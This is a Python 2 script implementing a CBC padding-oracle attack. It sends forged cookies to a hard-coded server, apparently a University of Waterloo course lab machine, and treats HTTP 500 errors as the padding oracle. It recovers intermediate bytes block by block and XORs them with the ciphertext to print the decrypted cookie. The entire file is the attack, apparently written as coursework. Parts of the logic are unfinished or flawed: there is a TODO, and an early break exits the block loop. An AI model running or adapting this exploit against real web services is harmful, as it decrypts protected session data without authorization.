#!/usr/bin/env python

import base64
import httplib2
import os
import sys

# Defaults
BLOCK_LEN = 16
URL = "http://ugster21.student.cs.uwaterloo.ca:4555/"
# URL = "http://localhost:4555"

h = httplib2.Http(".cache")
# Cookie: an unencoded cookie
def GETwithCookie( cookie ):
	cookie = base64.b64encode(cookie)
	return h.request(URL, "GET", headers={ "Cookie" : "user=" + cookie })

# Used to hit the ugster server for the first time
def visitURL():
	return h.request(URL, "GET")

# Check if unecnoded cookie provided has valid padding
def oracle( cookie ):
	resp, content = GETwithCookie(cookie)
	if( resp.status == 500):
		return False
	else:
		return True

def last_word_oracle(COOKIE):
	s = list(bytearray(base64.b64decode(COOKIE)))
	numOfBlocks = (len(s)/16)
	decoded_data = []

	# Loop over cookie, specifically the ciphertext which is all after 1st block
	#Skip first block which is IV
	for i in range(1, numOfBlocks): # numOfBlocks
		# 16 byte array that will store IV
		r = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
		key = bytearray(r)

		y = bytearray( s[ (i*16) : (i+1)*16 ] )

		for r_len in reversed( range(0, len(r)) ):
			# print "Deal with next r[{0}]".format(r_len)
			for r_byte in range(0, 256):
				r[r_len] = r_byte

				# Concat R|Y
				ry = bytearray(r) + y

				if oracle(ry):
					# y has correct padding of unknown length	
					# Determine padding size. All blocks have at least \x01 padding so start BLOCK_LEN-1
					padding = 1

					# Start looking from right to left
					for n in reversed( range(0, BLOCK_LEN-2) ):
						r_copy = list(r)
						r_copy[n] ^= 0x01
						
						# Check if oracle says it is valid padding
						if oracle( bytearray(r_copy) + y ):
							# If oracle tells us it is valid, padding now tells us the padding size
							# Stop

							# Now we know the padding amount
							# XOR all padding with n
							# TODO	Dont do for now						
							r[BLOCK_LEN-1] ^= padding

							# print r
							# print oracle(bytearray(r) + y)
							decrypt_block = block_decrypt_oracle(padding, r, y, (i == numOfBlocks-1) )
							decoded_data += decrypt_block
							break
						else:
							# We modified padding and it is now invalid
							# Keep going
							padding += 1
					break
			break

	# print decoded_data
	decrypt_cookie(s, decoded_data)

def block_decrypt_oracle(padding, r, y, lastBlock):
	inc = padding+1
	for i in reversed(range(0, BLOCK_LEN-padding)):
		r[BLOCK_LEN-1] ^= inc

		for r_byte in range(0, 255):
			r[i] = r_byte

			ry = bytearray(r) + y
			if oracle(ry):
				# print "TRUE"
				r[BLOCK_LEN-1] ^= inc
				if i != 0:
					inc += 1
				break

	# Look at each intermediary block
	# print r
	return r

# Takes in the cookie/ciphertext (base64.decoded) and decoded data (intermediary value)
def decrypt_cookie(decoded_cookie, decoded_data):
	pt = []
	for x in range(0, len(decoded_data)/16):
		# Get x-th block cookie
		c_block = decoded_cookie[16*x:(16*(x+1))]
		r_block = decoded_data[16*x: (16*(x+1))]

		for i in range(0, 16):
			pt.append( r_block[i] ^ c_block[i] )

	print pt
	print ''.join(chr(c) for c in pt)

def main():
# Check if cookie was passed in, other use default
	if( len(sys.argv) != 2 ):
		print "Please provide cookie"
		return

	cookie = sys.argv[1]
	# print sys.argv[1]
	
	last_word_oracle(cookie)

main()



	